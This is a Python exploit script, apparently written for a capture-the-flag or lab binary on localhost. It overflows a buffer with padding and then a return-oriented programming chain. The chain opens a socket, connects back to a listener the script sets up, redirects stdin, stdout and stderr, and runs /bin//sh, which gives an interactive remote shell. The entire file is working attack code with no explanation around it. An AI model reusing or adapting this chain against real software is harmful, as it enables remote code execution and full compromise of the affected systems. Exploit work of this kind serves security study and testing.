#!/usr/bin/env python3

from struct import pack
import socket
import sys
import time

from console import console

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT CONNECT_PORT" % sys.argv[0])


port = int(sys.argv[1])
sock = socket.create_connection(('127.0.0.1', port), socket.getdefaulttimeout(), ('127.0.0.1', 0))

new_socket = socket.socket()
new_socket.bind(('127.0.0.1', int(sys.argv[2])))
new_socket.listen(2)

   
p = b'A' * 29 # padding

p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x2) # AF_INET
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x1) # SOCK_STREAM
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x6) # IPPROTO_TCP
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x167) # SOCKET
p += pack('<I', 0x8085cc0) # _dl_sysinfo_int80

p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0) 
p += pack('<I', 0x081347a0) # add ebx, dword ptr [edx] ; add ecx, dword ptr [edx] ; ret

p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<h', 0x2) # AF_INET
p += pack('<h', 0)
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139062) # @ .data + 2
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('>h', int(sys.argv[2])) # CONNECT_PORT
p += pack('<h', 0)
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('>I', 0x7f000001) # 127.0.0.1
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139060) # @ .data

p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 16)

p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x16a) # CONNECT
p += pack('<I', 0x8085cc0) # _dl_sysinfo_int80


# dup code
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0)
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000003f) # dup2 sys call
p += pack('<I', 0x8085cc0) # _dl_sysinfo_int80

p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 1)
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000003f) # dup2 sys call
p += pack('<I', 0x8085cc0) # _dl_sysinfo_int80

p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 2)
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000003f) # dup2 sys call
p += pack('<I', 0x8085cc0) # _dl_sysinfo_int80

p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 11)
p += pack('<I', 0x08074ded) # int 0x80


sock.sendall(b'A'*1023)
time.sleep(1)
sock.sendall(p)

connection = new_socket.accept()[0]
console(connection)
# :vim set sw=4 ts=8 sts=8 expandtab: